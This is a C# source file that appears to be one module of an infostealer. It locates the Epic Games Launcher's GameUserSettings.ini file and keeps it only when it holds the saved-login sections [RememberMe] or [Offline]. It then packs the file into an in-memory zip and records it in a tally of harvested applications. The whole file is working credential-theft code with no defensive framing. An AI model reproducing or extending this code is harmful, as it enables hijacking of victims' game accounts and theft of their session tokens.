using Helper.Data;
using System;
using System.IO;
using System.Text;

namespace Targets.Games
{
	public class Epic : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");
	    if (!File.Exists(path))
	      return;
	    string s = File.ReadAllText(path);
	    if (!s.Contains("[RememberMe]") && !s.Contains("[Offline]"))
	      return;
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = "Epic Games";
	    string entryPath = "Epic\\GameUserSettings.ini";
	    zip.AddFile(entryPath, Encoding.UTF8.GetBytes(s));
	    counterApplications.Files.Add($"{path} => {entryPath}");
	    counter.Games.Add(counterApplications);
	  }
	}
}
